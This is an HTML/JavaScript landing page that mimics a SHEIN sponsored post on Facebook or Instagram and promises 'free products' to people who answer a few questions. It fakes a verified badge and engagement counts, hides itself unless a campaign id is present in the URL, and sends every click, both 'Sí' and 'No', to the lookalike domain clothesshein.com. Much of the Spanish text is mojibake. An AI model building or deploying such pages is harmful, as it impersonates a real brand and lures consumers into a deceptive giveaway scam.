<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHEIN - Productos Gratis</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #F0F2F5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            -webkit-font-smoothing: antialiased;
        }

        /* Instagram background */
        body.instagram-mode {
            background: linear-gradient(135deg, #833AB4 0%, #FD1D1D 50%, #FCAF45 100%);
        }

        .container {
            width: 100%;
            max-width: 500px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            border: 1px solid #E4E6EB;
            overflow: hidden;
        }

        /* Instagram container */
        body.instagram-mode .container {
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            border: 1px solid #DBDBDB;
        }

        /* Header */
        .header {
            padding: 16px;
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
        }

        /* Instagram header */
        body.instagram-mode .header {
            padding: 14px 16px;
            border-bottom: 1px solid #EFEFEF;
        }

        .header-left {
            display: flex;
            gap: 12px;
        }

        body.instagram-mode .header-left {
            gap: 10px;
        }

        .avatar {
            width: 40px;
            height: 40px;
            background-color: black;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-family: Georgia, serif;
            font-weight: bold;
            border-radius: 2px;
            flex-shrink: 0;
        }

        /* Instagram avatar */
        body.instagram-mode .avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            font-size: 16px;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            padding: 2px;
        }

        body.instagram-mode .avatar-inner {
            width: 100%;
            height: 100%;
            background-color: black;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
            font-family: Georgia, serif;
            font-weight: bold;
        }

        .header-info {
            display: flex;
            flex-direction: column;
        }

        .header-title {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .brand-name {
            font-weight: bold;
            color: #050505;
            font-size: 15px;
        }

        body.instagram-mode .brand-name {
            font-size: 14px;
            color: #262626;
        }

        .verified-badge {
            background-color: #1877F2;
            border-radius: 50%;
            padding: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        body.instagram-mode .verified-badge {
            background-color: #3897F0;
        }

        .header-meta {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 12px;
            color: #65676B;
            margin-top: 2px;
        }

        body.instagram-mode .header-meta {
            color: #8E8E8E;
            font-size: 12px;
        }

        .more-button {
            background: none;
            border: none;
            color: #65676B;
            padding: 8px;
            border-radius: 50%;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .more-button:hover {
            background-color: #F2F3F5;
        }

        body.instagram-mode .more-button {
            color: #262626;
            padding: 4px;
        }

        body.instagram-mode .more-button:hover {
            background-color: transparent;
        }

        /* Post Text */
        .post-text {
            padding: 0 16px 12px;
            font-size: 15px;
            color: #050505;
            line-height: 1.5;
        }

        /* Instagram hides post text before image */
        body.instagram-mode .post-text.before-image {
            display: none;
        }

        body.instagram-mode .post-text {
            padding: 12px 16px;
            font-size: 14px;
            color: #262626;
            line-height: 1.5;
            order: 3;
        }

        .post-text .bold {
            font-weight: bold;
        }

        body.instagram-mode .post-text .username {
            font-weight: 600;
            color: #262626;
        }

        /* Main Image */
        .main-image {
            width: 100%;
            background-color: #F7F8FA;
        }

        .main-image img {
            width: 100%;
            height: auto;
            max-height: 400px;
            object-fit: cover;
            display: block;
        }

        body.instagram-mode .main-image {
            background-color: #FAFAFA;
        }

        body.instagram-mode .main-image img {
            max-height: 500px;
        }

        /* CTA Section */
        .cta-section {
            padding: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            border-bottom: 1px solid #E4E6EB;
            padding-bottom: 24px;
        }

        body.instagram-mode .cta-section {
            border-bottom: 1px solid #EFEFEF;
            padding: 16px;
        }

        .cta-title {
            font-size: 20px;
            font-weight: bold;
            color: #050505;
            line-height: 1.3;
            margin-bottom: 4px;
        }

        body.instagram-mode .cta-title {
            font-size: 18px;
            color: #262626;
        }

        .cta-subtitle {
            color: #65676B;
            font-size: 15px;
            margin-bottom: 16px;
        }

        body.instagram-mode .cta-subtitle {
            color: #8E8E8E;
            font-size: 14px;
        }

        .button-group {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        body.instagram-mode .button-group {
            gap: 10px;
        }

        .cta-button {
            width: 100%;
            background-color: #1877F2;
            color: white;
            font-weight: bold;
            padding: 10px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .cta-button:hover {
            background-color: #166FE5;
        }

        body.instagram-mode .cta-button {
            background-color: #0095F6;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            padding: 12px;
        }

        body.instagram-mode .cta-button:hover {
            background-color: #1877F2;
        }

        /* Social Stats - Facebook */
        .social-stats {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: #65676B;
            font-size: 13px;
            border-bottom: 1px solid #E4E6EB;
        }

        /* Instagram Social Actions (replaces stats) */
        body.instagram-mode .social-stats {
            display: none;
        }

        .instagram-actions {
            display: none;
            padding: 12px 16px;
            border-bottom: 1px solid #EFEFEF;
        }

        body.instagram-mode .instagram-actions {
            display: block;
        }

        .instagram-actions-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .instagram-actions-left {
            display: flex;
            gap: 16px;
        }

        .instagram-action-btn {
            background: none;
            border: none;
            padding: 0;
            cursor: pointer;
        }

        .instagram-action-btn svg {
            width: 24px;
            height: 24px;
            stroke: #262626;
            fill: none;
            stroke-width: 2;
        }

        .instagram-action-btn.liked svg {
            fill: #ED4956;
            stroke: #ED4956;
        }

        .instagram-likes {
            font-weight: 600;
            font-size: 14px;
            color: #262626;
        }

        .stats-left {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .reaction-icons {
            display: flex;
            margin-left: -4px;
        }

        .reaction-icon {
            width: 18px;
            height: 18px;
            background-color: #1877F2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid white;
            position: relative;
            z-index: 10;
        }

        .stats-link {
            cursor: pointer;
        }

        .stats-link:hover {
            text-decoration: underline;
        }

        .stats-right {
            display: flex;
            gap: 12px;
        }

        /* Social Actions - Facebook */
        .social-actions {
            padding: 4px 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        body.instagram-mode .social-actions {
            display: none;
        }

        .action-button {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 8px;
            background: none;
            border: none;
            color: #65676B;
            font-weight: 500;
            font-size: 15px;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .action-button:hover {
            background-color: #F2F3F5;
        }

        .icon {
            width: 20px;
            height: 20px;
            stroke: currentColor;
            fill: none;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .icon-small {
            width: 10px;
            height: 10px;
            stroke: white;
            fill: white;
            stroke-width: 4;
        }

        .icon-tiny {
            width: 12px;
            height: 12px;
        }

        /* Instagram Comments Preview */
        .instagram-comments {
            display: none;
            padding: 0 16px 8px;
        }

        body.instagram-mode .instagram-comments {
            display: block;
        }

        .instagram-view-comments {
            color: #8E8E8E;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 8px;
        }

        .instagram-timestamp {
            color: #8E8E8E;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.2px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="header-left">
                <div class="avatar">
                    <span class="avatar-inner">S</span>
                </div>
                <div class="header-info">
                    <div class="header-title">
                        <span class="brand-name">SHEIN</span>
                        <div class="verified-badge">
                            <svg class="icon-small" viewBox="0 0 24 24">
                                <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                        </div>
                    </div>
                    <div class="header-meta">
                        <span class="meta-text">Publicidad</span>
                        <span class="meta-separator">â€¢</span>
                        <svg class="icon-tiny globe-icon" viewBox="0 0 24 24">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="2" y1="12" x2="22" y2="12"></line>
                            <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
                        </svg>
                    </div>
                </div>
            </div>
            <button class="more-button">
                <svg class="icon" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="1"></circle>
                    <circle cx="19" cy="12" r="1"></circle>
                    <circle cx="5" cy="12" r="1"></circle>
                </svg>
            </button>
        </div>

        <!-- Post Text (Facebook - before image) -->
        <div class="post-text before-image">
            <p>
                ðŸŽ‰ Â¡Estamos regalando <span class="bold">productos GRATIS</span> a participantes afortunados!
                Responde algunas preguntas sencillas para ver si calificas para una entrega gratuita en tu puerta. ðŸ“¦ âœ¨
            </p>
        </div>

        <!-- Main Image -->
        <div class="main-image">
            <img src="images/blue_and_white_gift_boxes_pile.png" 
                 alt="Pila de cajas de regalo azules y blancas">
        </div>

        <!-- Instagram Actions -->
        <div class="instagram-actions">
            <div class="instagram-actions-row">
                <div class="instagram-actions-left">
                    <button class="instagram-action-btn liked">
                        <svg viewBox="0 0 24 24">
                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
                        </svg>
                    </button>
                    <button class="instagram-action-btn">
                        <svg viewBox="0 0 24 24">
                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                        </svg>
                    </button>
                    <button class="instagram-action-btn">
                        <svg viewBox="0 0 24 24">
                            <line x1="22" y1="2" x2="11" y2="13"></line>
                            <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                        </svg>
                    </button>
                </div>
                <button class="instagram-action-btn">
                    <svg viewBox="0 0 24 24">
                        <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
                    </svg>
                </button>
            </div>
            <div class="instagram-likes">24,892 Me gusta</div>
        </div>

        <!-- Post Text (Instagram - after actions) -->
        <div class="post-text after-image">
            <p>
                <span class="username">shein_official</span> ðŸŽ‰ Â¡Estamos regalando <span class="bold">productos GRATIS</span> a participantes afortunados!
                Responde algunas preguntas sencillas para ver si calificas para una entrega gratuita en tu puerta. ðŸ“¦ âœ¨
            </p>
        </div>

        <!-- CTA Section -->
        <div class="cta-section">
            <div>
                <h2 class="cta-title">Â¿Te gustarÃ­a recibir productos gratis?</h2>
                <p class="cta-subtitle">Estamos buscando probadores de productos en tu Ã¡rea.</p>
            </div>

            <div class="button-group">
                <button class="cta-button" onclick="handleVote()">SÃ­</button>
                <button class="cta-button" onclick="handleVote()">No</button>
            </div>
        </div>

        <!-- Social Stats - Facebook -->
        <div class="social-stats">
            <div class="stats-left">
                <div class="reaction-icons">
                    <div class="reaction-icon">
                        <svg class="icon-small" viewBox="0 0 24 24">
                            <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path>
                        </svg>
                    </div>
                </div>
                <span class="stats-link">2,4 mil</span>
            </div>
            
            <div class="stats-right">
                <span class="stats-link">458 comentarios</span>
                <span class="stats-link">129 veces compartido</span>
            </div>
        </div>

        <!-- Social Actions - Facebook -->
        <div class="social-actions">
            <button class="action-button">
                <svg class="icon" viewBox="0 0 24 24">
                    <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path>
                </svg>
                <span>Me gusta</span>
            </button>
            <button class="action-button">
                <svg class="icon" viewBox="0 0 24 24">
                    <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                </svg>
                <span>Comentar</span>
            </button>
            <button class="action-button">
                <svg class="icon" viewBox="0 0 24 24">
                    <circle cx="18" cy="5" r="3"></circle>
                    <circle cx="6" cy="12" r="3"></circle>
                    <circle cx="18" cy="19" r="3"></circle>
                    <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
                    <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
                </svg>
                <span>Compartir</span>
            </button>
        </div>

        <!-- Instagram Comments -->
        <div class="instagram-comments">
            <div class="instagram-view-comments">Ver los 458 comentarios</div>
            <div class="instagram-timestamp">Hace 2 horas</div>
        </div>
    </div>

    <script>
        // ConfiguraÃ§Ã£o dos quizzes
        const quizzes = {
            'clsh-xmas': {
                postText: 'ðŸŽ‰ Â¡Estamos regalando <span class="bold">productos GRATIS</span> a participantes afortunados! Responde algunas preguntas sencillas para ver si calificas para una entrega gratuita en tu puerta. ðŸ“¦ âœ¨',
                ctaTitle: 'Â¿Te gustarÃ­a recibir productos gratis?',
                ctaSubtitle: 'Estamos buscando probadores de productos en tu Ã¡rea.',
                answers: [
                    { text: 'SÃ­', redirect: 'https://clothesshein.com/shn-1/' },
                    { text: 'No', redirect: 'https://clothesshein.com/shn-1/' }
                ],
                privacyUrl: 'https://clothesshein.com/privacy-policy/'
            },
            'clsh-rp': {
                postText: 'ðŸŽ‰ Â¡Estamos regalando <span class="bold">productos GRATIS</span> a participantes afortunados! Responde algunas preguntas sencillas para ver si calificas para una entrega gratuita en tu puerta. ðŸ“¦ âœ¨',
                ctaTitle: 'Â¿Te gustarÃ­a recibir productos gratis?',
                ctaSubtitle: 'Estamos buscando probadores de productos en tu Ã¡rea.',
                answers: [
                    { text: 'SÃ­', redirect: 'https://clothesshein.com/shn-1/' },
                    { text: 'No', redirect: 'https://clothesshein.com/shn-1/' }
                ],
                privacyUrl: 'https://clothesshein.com/privacy-policy/'
            }
        };

        // Cookie functions
        function setCookie(name, value, days) {
            const expires = new Date();
            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
            document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Lax`;
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        // Detect platform (first visit = facebook, second = instagram)
        function detectPlatform() {
            const visitCount = getCookie('shein_visit_count');
            
            if (!visitCount) {
                // First visit - show Facebook, set cookie
                setCookie('shein_visit_count', '1', 30); // 30 days
                return 'facebook';
            } else {
                // Second+ visit - show Instagram
                const count = parseInt(visitCount) + 1;
                setCookie('shein_visit_count', count.toString(), 30);
                return 'instagram';
            }
        }

        // Apply platform styling
        function applyPlatformStyles(platform) {
            if (platform === 'instagram') {
                document.body.classList.add('instagram-mode');
                
                // Update header meta for Instagram
                const metaText = document.querySelector('.meta-text');
                if (metaText) metaText.textContent = 'Patrocinado';
                
                // Hide globe icon for Instagram
                const globeIcon = document.querySelector('.globe-icon');
                if (globeIcon) globeIcon.style.display = 'none';
                
                // Hide separator
                const separator = document.querySelector('.meta-separator');
                if (separator) separator.style.display = 'none';
                
                // Update avatar for Instagram (just letter, no inner span needed for Facebook)
                const avatar = document.querySelector('.avatar');
                if (avatar && !avatar.querySelector('.avatar-inner')) {
                    avatar.innerHTML = '<span class="avatar-inner">S</span>';
                }
            } else {
                // Facebook mode - fix avatar
                const avatar = document.querySelector('.avatar');
                if (avatar) {
                    avatar.innerHTML = 'S';
                }
            }
        }

        // FunÃ§Ã£o para pegar o ID da URL
        function getQuizId() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        // FunÃ§Ã£o para propagar parÃ¢metros UTM
        function buildRedirectUrl(baseUrl) {
            const currentParams = new URLSearchParams(window.location.search);
            const redirectUrl = new URL(baseUrl);
            
            const paramsToPropagate = [
                'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
                'fbclid', 'gclid', 'ref'
            ];
            
            paramsToPropagate.forEach(param => {
                if (currentParams.has(param)) {
                    redirectUrl.searchParams.set(param, currentParams.get(param));
                }
            });
            
            return redirectUrl.toString();
        }

        // FunÃ§Ã£o para redirecionar para a URL principal
        function redirectToMain() {
            const quizId = getQuizId();
            const quiz = quizzes[quizId];
            if (quiz && quiz.answers && quiz.answers[0]) {
                window.location.href = buildRedirectUrl(quiz.answers[0].redirect);
            }
        }

        // FunÃ§Ã£o para carregar o quiz
        function loadQuiz() {
            const quizId = getQuizId();
            const quiz = quizzes[quizId];

            // Detect and apply platform
            const platform = detectPlatform();
            applyPlatformStyles(platform);

            // Se nÃ£o encontrar o quiz, nÃ£o mostrar nada
            if (!quiz) {
                document.querySelector('.container').style.display = 'none';
                document.body.style.backgroundColor = '#ffffff';
                document.body.classList.remove('instagram-mode');
                return;
            }

            // Atualizar texto do post (both versions)
            document.querySelectorAll('.post-text p').forEach(p => {
                if (platform === 'instagram') {
                    p.innerHTML = '<span class="username">shein_official</span> ' + quiz.postText;
                } else {
                    p.innerHTML = quiz.postText;
                }
            });

            // Atualizar tÃ­tulo CTA
            document.querySelector('.cta-title').textContent = quiz.ctaTitle;

            // Atualizar subtÃ­tulo CTA
            document.querySelector('.cta-subtitle').textContent = quiz.ctaSubtitle;

            // Atualizar botÃµes de resposta (SÃ­/No)
            const buttonGroup = document.querySelector('.button-group');
            buttonGroup.innerHTML = '';
            
            quiz.answers.forEach(answer => {
                const button = document.createElement('button');
                button.className = 'cta-button';
                button.textContent = answer.text;
                button.onclick = redirectToMain;
                buttonGroup.appendChild(button);
            });

            // Adicionar redirect aos botÃµes de aÃ§Ã£o social - Facebook (Like, Comment, Share)
            document.querySelectorAll('.action-button').forEach(button => {
                button.onclick = redirectToMain;
            });

            // Adicionar redirect aos stats - Facebook (likes count, comments, shares)
            document.querySelectorAll('.stats-link').forEach(link => {
                link.onclick = redirectToMain;
            });

            // Adicionar redirect ao botÃ£o more (trÃªs pontos)
            document.querySelector('.more-button').onclick = redirectToMain;

            // Instagram specific redirects
            document.querySelectorAll('.instagram-action-btn').forEach(button => {
                button.onclick = redirectToMain;
            });

            const instagramLikes = document.querySelector('.instagram-likes');
            if (instagramLikes) instagramLikes.onclick = redirectToMain;

            const viewComments = document.querySelector('.instagram-view-comments');
            if (viewComments) viewComments.onclick = redirectToMain;

            // Main image click
            document.querySelector('.main-image').onclick = redirectToMain;

            // Header click
            document.querySelector('.header-left').onclick = redirectToMain;
        }

        // Carregar quiz quando a pÃ¡gina carregar
        document.addEventListener('DOMContentLoaded', loadQuiz);
    </script>
</body>
</html>
